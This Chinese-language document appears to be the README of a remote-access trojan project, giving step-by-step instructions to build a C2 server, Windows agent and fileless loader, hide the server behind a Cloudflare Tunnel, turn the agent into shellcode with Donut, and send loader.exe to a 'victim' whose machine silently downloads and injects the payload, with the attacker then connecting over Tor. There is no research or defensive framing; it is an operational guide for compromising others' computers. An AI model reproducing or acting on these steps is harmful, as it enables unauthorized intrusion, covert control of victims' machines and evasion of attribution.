
# C2-project 编译、部署与安装指南

本文档详细介绍了 C2-project 项目的编译、网络基础设施搭建、Payload 生成及最终部署流程。

## 📋 1. 运行环境说明

本项目采用异构架构，各组件针对以下特定环境设计：

*   **C2 服务器 (Server)**:
    *   架构: **Linux (ARM 架构)** (如树莓派、Oracle Cloud ARM 实例)
    *   功能: 监听心跳、托管静态资源、提供 Web 控制台 API。
*   **被控端 (Agent) & 加载器 (Loader)**:
    *   架构: **Windows (AMD64/x64 架构)**
    *   功能: Agent 负责核心业务，Loader 负责无文件加载。

---

## 🛠️ 2. 编译阶段

### 2.1 准备工作
确保开发环境已安装：`Go` (1.20+), `Make`, `Git`。

下载依赖：
```bash
make deps
```

### 2.2 执行编译

**Linux / macOS (使用 Make):**

```bash
# 一键编译所有组件 (Server/ARM, Agent/Win64, Loader/Win64)
make all
```

**Windows (使用脚本):**

```powershell
# PowerShell
.\build.ps1
```

**编译产物 (`build/` 目录):**
*   `server`: Linux ARM 可执行文件。
*   `agent.exe`: Windows 原始木马文件（用于生成 Shellcode，不直接投放）。
*   `loader.exe`: Windows 加载器（最终投放给受害者的文件）。

---

## 🌐 3. 网络拓扑环境搭建 (Cloudflare Tunnel)

为了隐藏 C2 服务器的真实 IP，我们需要配置 Cloudflare Tunnel 将流量转发至本地端口。

### 3.1 基础设施准备
*   一个真实域名（已托管至 Cloudflare）。
*   一台 Linux 服务器（VPS）。

### 3.2 服务器端安装 Cloudflared
在你的 **Linux Server** 上执行：

```bash
# 下载 Cloudflared (自动适配 ARM/AMD64)
curl -L --output cloudflared.deb https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
sudo dpkg -i cloudflared.deb

# 登录认证 (需将浏览器显示的 URL 复制出来登录，或上传本地 cert.pem)
cloudflared tunnel login
```

### 3.3 创建与配置隧道
1.  **创建隧道**:
    ```bash
    cloudflared tunnel create c2-tunnel
    # 记下生成的 Tunnel UUID
    ```

2.  **配置 DNS 路由**:
    ```bash
    # 将 api.yourdomain.com 指向隧道
    cloudflared tunnel route dns c2-tunnel api
    ```

3.  **创建配置文件 `config.yml`**:
    ```yaml
    tunnel: <Tunnel-UUID>
    credentials-file: /root/.cloudflared/<Tunnel-UUID>.json
    ingress:
      # 将公网流量转发给 C2 Server
      - hostname: api.yourdomain.com
        service: http://localhost:8080
      # 兜底规则
      - service: http_status:404
    ```

4.  **启动隧道**:
    ```bash
    # 前台测试运行
    cloudflared tunnel run c2-tunnel
    
    # 或安装为系统服务 (推荐)
    sudo cloudflared service install
    sudo systemctl start cloudflared
    ```

---

## 🚀 4. 软件部署与运行

### 4.1 核心步骤：生成 Shellcode (Payload)
`loader.exe` 并不包含恶意逻辑，它需要从服务器下载 Shellcode。因此，我们需要将编译好的 `agent.exe` 转换为 `payload.bin`。

1.  准备工具：下载 [Donut](https://github.com/TheWover/donut)。
2.  在开发机上执行转换命令：

```powershell
# -i 输入文件, -a 2 (x64架构), -o 输出文件
.\donut.exe -i build/agent.exe -a 2 -o payload.bin -b 1
```

### 4.2 服务端部署 (Server Side)
将以下文件上传至 Linux 服务器的同一目录（例如 `/root/c2/`）：

1.  `build/server` (编译好的 Linux ARM 程序)
2.  `web/index.html` (Web 控制台前端)
3.  `payload.bin` (上一步生成的 Shellcode)

**启动 Server:**

```bash
# 赋予执行权限
chmod +x server

# 后台运行 (日志输出到 c2.log)
nohup ./server > c2.log 2>&1 &
```

> **验证**: 在浏览器访问 `https://api.yourdomain.com`，应能看到 Web 控制台界面。同时访问 `https://api.yourdomain.com/payload.bin` 应能下载文件。

### 4.3 受害端运行 (Victim Side)
将编译好的 **`build/loader.exe`** 发送给受害主机（Windows 10/11）。

1.  **运行**: 双击 `loader.exe`。
2.  **现象**: 
    *   Loader 启动并隐藏窗口。
    *   自动从 Cloudflare CDN 下载 `payload.bin`。
    *   执行内存注入。
3.  **上线**: 此时在攻击者的 Web 控制台上应能看到受害主机上线。

### 4.4 攻击者连接
攻击者推荐使用 **Tor Browser** 或隐身模式浏览器访问 C2 域名：
`https://api.yourdomain.com`

---

## 🧹 清理环境

```bash
# 清理本地编译产物
make clean

# 停止服务器进程
pkill server
```